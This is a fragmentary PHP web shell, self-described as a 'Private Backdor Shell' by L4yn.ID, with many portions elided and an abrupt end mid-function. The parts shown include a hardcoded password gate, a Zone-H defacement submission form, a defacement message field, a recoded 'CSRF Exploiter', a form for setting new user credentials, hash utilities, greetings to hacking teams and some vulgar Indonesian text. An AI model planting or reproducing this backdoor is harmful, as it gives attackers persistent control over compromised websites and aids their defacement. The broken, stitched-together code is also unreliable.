...
//////////////////////////////////////////
/// Priv Shell L4yn.ID ///////////////////////////
/// Private Backdor Shell By L4yn.ID//////////////
/// Password Login Shell : sangean //////
////////////////////////////////////////
 ...
 session_start();
 $pass = "0813830as290802";
 $link = "fvck.txt";
 if($_POST['password'] == $pass) {
 $_SESSION['forbidden'] = $pass;
 echo "<script>window.location='?L4yn.ID'</script>";
 }
 if($_GET['page'] == "blank") {
 echo "<a href='?'>Back</a>";
 exit();
 ...
 session_destroy();
 echo "<script>window.location='?Mr.Lutfie'</script>";
 }
 if(!($_SESSION['forbidden'])) {
 ?>
 <title>XxX L4yn.ID_Priv_Shell XxX </title>
 ...
 <body bgcolor="black">
 <center><img src="https://k.top4top.io/p_1811sjldb1.jpeg" style="opacity:0.5; width:200px; height:300px";></center>
 <center><h1><center><font color="red" face="Patrick Hand">XxX </font><font color="white" face="Patrick Hand">L4yn.ID Priv Shell</font><font color="Red" face="Patrick Hand"> XxX</font><br>
 </center>
...
<title>XxX L4yn.ID_Priv_Shell XxX</title>
<meta property="og:image" https://f.top4top.io/p_1811bqazm1.jpg">
<style>
body{
...
<center>
<br>
<font face="Kelly Slab" color="white" size="7px">XxX L4yn.ID_Priv_Shell XxX</font><br>
</h1></center>
...
+ Coded By   <td>: <font color='lime'> L4yn.ID | Diam Itu Lebih Baik<tr><td><font color='white'>
+ Thanks To  <td>: <font color='lime'> Tangerang Xploit Team // Wibu Cyber Team</font></tr></td><br>
</table>";
...
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='L4yn.ID'><br>
		<u>Domains</u>: <br>
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='L4yn.ID'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='GALAXY XPLOITER TEAM'><br>
		<u>Domains</u>: <br>
...
<p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By L4yn.ID</textarea><br>
	...
	{	
	echo '<html>
	<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by L4yn.ID</h1><br><br>
...
echo "</div>";
 ...
 Set User & Pass: <br>
 <input type='text' name='user_baru' value='L4yn.ID' placeholder='user_baru'><br>
 <input type='text' name='pass_baru' value='L4yn.ID' placeholder='pass_baru'><br>
 ...
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
   ...
   <td>
   <center>
   <h2 style='color'blue'>Privat Shell L4yn.ID</font></h2>
   <p style='color: white;'>GreetZ:</p>
   <font color="cyan">[</font>
   <marquee behavior="alternate" scrollamount="10" style="width: 40%;">Galaxy Xploiter Team - DragonXploiter -SharkXploiter</marquee>
   <font color="cyan">]</font>
   <p>Ngentot Enak Pastinya:v</p>
   </center>
   </td>
   </tr>
   <?php
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">Copyright &copy;2020 L4yn.ID|  Allright Reserved</center>
</body>
</html>';
function perms($file){
